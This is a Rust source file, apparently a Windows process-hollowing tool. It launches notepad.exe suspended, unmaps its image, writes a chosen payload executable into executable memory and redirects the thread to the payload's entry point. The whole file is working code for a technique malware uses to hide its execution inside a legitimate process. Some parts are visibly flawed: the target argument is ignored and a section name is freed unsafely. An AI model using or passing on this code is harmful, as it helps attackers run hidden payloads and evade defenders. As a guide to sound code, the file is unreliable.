use std::{
    ffi::CString,
    fs::{self, File},
    io::Read,
    mem::zeroed,
    ops::Add,
    ptr::null_mut,
};

use windows_sys::{
    Wdk::System::{
        Memory::NtUnmapViewOfSection,
        Threading::{NtQueryInformationProcess, ProcessWin32kSyscallFilterInformation},
    },
    Win32::System::{
        Diagnostics::Debug::{
            CONTEXT, GetThreadContext, IMAGE_FILE_HEADER, IMAGE_NT_HEADERS64, IMAGE_SECTION_HEADER,
            ReadProcessMemory, SetThreadContext, WriteProcessMemory,
        },
        Memory::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, VirtualAllocEx},
        SystemServices::{IMAGE_DOS_HEADER, IMAGE_DOS_SIGNATURE, IMAGE_NT_SIGNATURE},
        Threading::{
            CREATE_SUSPENDED, CreateProcessA, PROCESS_BASIC_INFORMATION, PROCESS_INFORMATION,
            ResumeThread, STARTUPINFOA,
        },
    },
};

fn main() {
    let args = std::env::args().collect::<Vec<String>>();

    if args.len() < 3 {
        println!("Usage: {} <target_process> <payload_path>", args[0]);
        println!(
            "  [+] {} C:\\Windows\\System32\\notepad.exe C:\\Windows\\System32\\calc.exe",
            args[0]
        );
        return;
    }

    let mut fd = match File::open(args.get(2).unwrap()) {
        Ok(file) => file,
        Err(e) => {
            println!("[-] Failed to open payload file: {}", e);
            return;
        }
    };

    let mut buffer: Vec<u8> = Vec::new();

    fd.read_to_end(&mut buffer).unwrap();

    println!("[+] Payload file size: {} bytes", buffer.len());

    let mut fd2 = match File::open(args.get(1).unwrap()) {
        Ok(file) => file,
        Err(e) => {
            println!("[-] Failed to open target process file: {}", e);
            return;
        }
    };

    let mut buffer2: Vec<u8> = Vec::new();

    fd2.read_to_end(&mut buffer2).unwrap();

    println!("[+] Target process file size: {} bytes", buffer2.len());

    if buffer2.len() < buffer.len() {
        println!("[-] Target process file is smaller than payload file");
        return;
    }

    let proc_name = "C:\\Windows\\System32\\notepad.exe\0";

    unsafe {
        let mut si = zeroed::<STARTUPINFOA>();
        si.cb = size_of::<STARTUPINFOA>() as u32;
        let mut pi = zeroed::<PROCESS_INFORMATION>();

        if CreateProcessA(
            proc_name.as_ptr() as *const u8,
            null_mut(),
            null_mut(),
            null_mut(),
            0,
            CREATE_SUSPENDED,
            null_mut(),
            null_mut(),
            &mut si,
            &mut pi,
        ) == 0
        {
            println!("[-] Failed to create process");
            return;
        }

        println!("[+] Created suspended process with PID: {}", pi.dwProcessId);

        let mut pbi = zeroed::<PROCESS_BASIC_INFORMATION>();
        let mut return_length = 0;
        let mut status = NtQueryInformationProcess(
            pi.hProcess,
            0,
            &mut pbi as *mut _ as *mut _,
            size_of::<PROCESS_BASIC_INFORMATION>() as u32,
            &mut return_length,
        );

        if status != 0 {
            println!("[-] Failed to query process information");
            return;
        }

        let mut base_addr = 0;
        let mut bytes_read = 0;
        if ReadProcessMemory(
            pi.hProcess,
            (pbi.PebBaseAddress as usize + 0x10) as *const _,
            &mut base_addr as *mut _ as *mut _,
            size_of::<usize>() as usize,
            &mut bytes_read,
        ) == 0
        {
            println!("[-] Failed to read process memory");
            return;
        }

        let status = NtUnmapViewOfSection(pi.hProcess, base_addr as *const _);
        if status != 0 {
            println!("[-] Failed to unmap view of section");
            return;
        }

        let dos_header = buffer.as_ptr() as *const IMAGE_DOS_HEADER;

        if (*dos_header).e_magic != IMAGE_DOS_SIGNATURE {
            println!("[-] Invalid DOS signature in payload");
            return;
        }

        let nt_headers =
            (buffer.as_ptr()).add((*dos_header).e_lfanew as usize) as *const IMAGE_NT_HEADERS64;

        if (*nt_headers).Signature != IMAGE_NT_SIGNATURE {
            println!("[-] Invalid NT signature in payload");
            return;
        }

        let size_of_image = (*nt_headers).OptionalHeader.SizeOfImage;

        let address_of_entry_point = (*nt_headers).OptionalHeader.AddressOfEntryPoint;

        let remote_buffer = VirtualAllocEx(
            pi.hProcess,
            null_mut(),
            size_of_image as usize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        );

        if remote_buffer.is_null() {
            println!("[-] Failed to allocate memory in target process");
            return;
        }

        let headers_size = (*nt_headers).OptionalHeader.SizeOfHeaders;
        let mut bytes_written = 0;
        if WriteProcessMemory(
            pi.hProcess,
            remote_buffer,
            buffer.as_ptr() as *const _,
            headers_size as usize,
            &mut bytes_written,
        ) == 0
        {
            println!("[-] Failed to write headers to target process");
            return;
        }

        let number_of_sections = (*nt_headers).FileHeader.NumberOfSections;
        let opt_header_size = (*nt_headers).FileHeader.SizeOfOptionalHeader as usize;
        let first_section = (nt_headers as *const u8)
            .add(4 + size_of::<IMAGE_FILE_HEADER>() + opt_header_size)
            as *const IMAGE_SECTION_HEADER;

        for i in 0..number_of_sections {
            let sec_name =
                CString::from_raw((*first_section.add(i as usize)).Name.as_ptr() as *mut i8)
                    .into_string()
                    .unwrap();

            println!("[+] Writing section {} to target process", sec_name);

            let section = first_section.add(i as usize);
            let virtual_addr = (*section).VirtualAddress;
            let size_of_raw_data = (*section).SizeOfRawData;
            let pointer_to_raw_data = (*section).PointerToRawData;

            if size_of_raw_data == 0 {
                continue;
            }

            if WriteProcessMemory(
                pi.hProcess,
                (remote_buffer as usize + virtual_addr as usize) as *mut _,
                buffer.as_ptr().add(pointer_to_raw_data as usize) as *const _,
                size_of_raw_data as usize,
                &mut bytes_written,
            ) == 0
            {
                println!("[-] Failed to write section {} to target process", sec_name);
                return;
            }
        }

        let mut ctx = zeroed::<CONTEXT>();

        if GetThreadContext(pi.hThread, &mut ctx) == 0 {
            println!("[-] Failed to get thread context");
            return;
        }

        ctx.Rcx = (remote_buffer as *const u8).add(address_of_entry_point as usize) as u64;

        if SetThreadContext(pi.hThread, &ctx) == 0 {
            println!("[-] Failed to set thread context");
            return;
        }

        ResumeThread(pi.hThread);
    }
}
